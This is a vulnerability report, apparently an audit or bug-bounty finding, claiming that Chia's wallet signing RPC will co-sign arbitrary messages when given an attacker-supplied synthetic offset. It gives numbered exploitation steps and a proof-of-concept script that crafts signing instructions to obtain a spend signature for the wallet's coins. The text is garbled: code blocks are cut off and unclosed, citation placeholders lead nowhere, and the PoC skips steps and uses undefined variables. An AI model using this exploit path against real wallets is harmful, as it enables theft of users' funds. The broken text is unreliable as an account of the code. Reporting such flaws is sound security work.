### Title
Wallet `execute_signing_instructions` Unconditionally Signs Arbitrary Messages via Attacker-Supplied `SumHint.synthetic_offset` — (`chia/wallet/wallet.py`)

### Summary

`Wallet.execute_signing_instructions` accepts caller-supplied `SumHint` objects and unconditionally derives a `PrivateKey` from `sum_hint.synthetic_offset`, adds it to `sk_lookup`, then co-signs any attacker-chosen message with both that ephemeral key and the wallet's own `root_sk`. Because `synthetic_offset` is never validated against the wallet's own key derivation, any RPC caller can obtain a valid BLS aggregate signature under the wallet's real synthetic public key for an arbitrary message — including a coin-spend authorization.

### Finding Description

In `chia/wallet/wallet.py`, `execute_signing_instructions` processes `SumHint` entries without any ownership check on `synthetic_offset`:

```python
# Add any synthetic offsets as keys we "have"

pk_lookup[offset_pk.get_fingerprint()] = offset_pk
sk_lookup[offset_pk.get_fingerprint()] = offset_sk             # ← added unconditionally

The RPC handler at `wallet_rpc_api.py:3739` passes the caller's `SigningInstructions` directly to this function with no additional authorization: [3](#0-2) 

The `SumHint` data structure accepts arbitrary bytes for `synthetic_offset` and `final_pubkey`: [4](#0-3) 

The wallet's standard coin puzzle (`p2_delegated_puzzle_or_hidden_puzzle`) uses `synthetic_pk = root_pk + calculate_synthetic_offset(root_pk, DEFAULT_HIDDEN_PUZZLE_HASH) * G` as the signing key. `calculate_synthetic_offset` is a public, deterministic function: [5](#0-4) 

### Impact Explanation

An attacker with wallet RPC access (any process running as the same OS user, which can read the private SSL certificate from `~/.chia/mainnet/config/ssl/daemon/`) can:

1. Obtain `root_pk` via any wallet RPC that exposes public keys.
2. Compute `synthetic_offset = calculate_synthetic_offset(root_pk, DEFAULT_HIDDEN_PUZZLE_HASH)` — fully public.
3. Compute `synthetic_pk = root_pk + synthetic_offset * G` — the wallet's real signing key for standard coins.
4. Choose a target coin spend: compute `message = delegated_puzzle_hash + coin_id + AGG_SIG_ME_ADDITIONAL_DATA`.
5. Call `execute_signing_instructions` with:
   - `SumHint(fingerprints=[root_fingerprint], synthetic_offset=synthetic_offset_bytes, final_pubkey=bytes(synthetic_pk))`
   - `SigningTarget(fingerprint=synthetic_pk.get_fingerprint().to_bytes(4,"big"), message=message, hook=...)`
6. The wallet returns `AugSchemeMPL.aggregate([sign(offset_sk, msg, synthetic_pk), sign(root_sk, msg, synthetic_pk)])` — a valid signature under `synthetic_pk` for the attacker-chosen message.
7. The attacker submits a spend bundle using this signature to spend any coin locked to `synthetic_pk`.

The existing test suite at `test_signer_protocol.py:338–363` directly demonstrates this behavior — it passes an arbitrary `other_sk = PrivateKey.from_bytes(test_name)` as the offset and asserts the wallet co-signs with `root_sk` for any message: [6](#0-5) 

### Likelihood Explanation

The wallet RPC is protected by mutual TLS using a private CA whose certificate is stored on the local filesystem. Any process running as the same OS user (e.g., a malicious dApp, browser extension, or script) can read the certificate and call the RPC. The attack requires no cryptographic break, no leaked seed phrase, and no special privilege beyond local user access. The root fingerprint (4 bytes) is trivially obtained from other wallet RPC calls.

### Recommendation

Before signing with `offset_sk`, verify that `sum_hint.synthetic_offset` equals `calculate_synthetic_offset(pk, DEFAULT_HIDDEN_PUZZLE_HASH).to_bytes(32, "big")` for a public key the wallet legitimately owns. Alternatively, restrict `execute_signing_instructions` so it only accepts `SigningInstructions` that were produced by the wallet's own `gather_signing_info` (e.g., by binding them to a session token or by re-deriving and comparing the expected offset). At minimum, the endpoint should refuse to sign messages that were not generated through the wallet's own transaction-building pipeline.

from chia.wallet.wallet_request_types import ExecuteSigningInstructions

# Step 1: obtain root_pk from wallet RPC (e.g. get_public_key)

# Step 2: compute the wallet's real synthetic key — all public info
synthetic_offset_int = calculate_synthetic_offset(root_pk, DEFAULT_HIDDEN_PUZZLE_HASH)
synthetic_offset_bytes = synthetic_offset_int.to_bytes(32, "big")

instructions = SigningInstructions(
    KeyHints(
        sum_hints=[SumHint([root_fingerprint], synthetic_offset_bytes, bytes(synthetic_pk))],
        path_hints=[],
    ),
    targets=[SigningTarget(
        fingerprint=synthetic_pk.get_fingerprint().to_bytes(4, "big"),
        message=message,
        hook=bytes(32),
    )],
)
response = await wallet_rpc.execute_signing_instructions(
    ExecuteSigningInstructions(signing_instructions=instructions, partial_allowed=False)
)

# Step 5: assert the returned signature verifies under synthetic_pk
sig = G2Element.from_bytes(response.signing_responses[0].signature)

def calculate_synthetic_offset(public_key: G1Element, hidden_puzzle_hash: bytes32) -> int:
    blob = hashlib.sha256(bytes(public_key) + hidden_puzzle_hash).digest()
    offset = int_from_bytes(blob)
    offset %= GROUP_ORDER
    return offset
